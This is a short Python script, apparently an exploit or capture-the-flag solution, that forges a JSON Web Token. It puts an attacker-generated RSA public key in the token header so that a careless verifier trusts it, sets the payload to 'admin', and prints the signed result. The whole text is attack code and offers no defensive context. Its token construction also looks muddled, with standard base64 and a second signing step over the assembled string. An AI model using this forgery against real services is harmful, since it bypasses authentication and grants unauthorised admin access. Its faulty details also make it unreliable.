from jwcrypto import jwk, jws
from jwcrypto.common import json_encode
import json
import base64

key = jwk.JWK.generate(kty='RSA', size=2048)
y = json.loads(key.export())
n = y['n']
e = y['e']

# generating header
header='{"alg":"RS256","jwk":{"kty":"RSA","kid":"garbage","use":"sig","n":"'+n+'","e":"'+e+'"}}'
payload = b'admin'
pwn = base64.b64encode(header.encode()) + b'.' + base64.b64encode(payload)

# generating signature
jwstoken = jws.JWS(pwn)
jwstoken.add_signature(key, None, json_encode({"alg": "RS256"}))
sig = jwstoken.serialize()
print(sig)

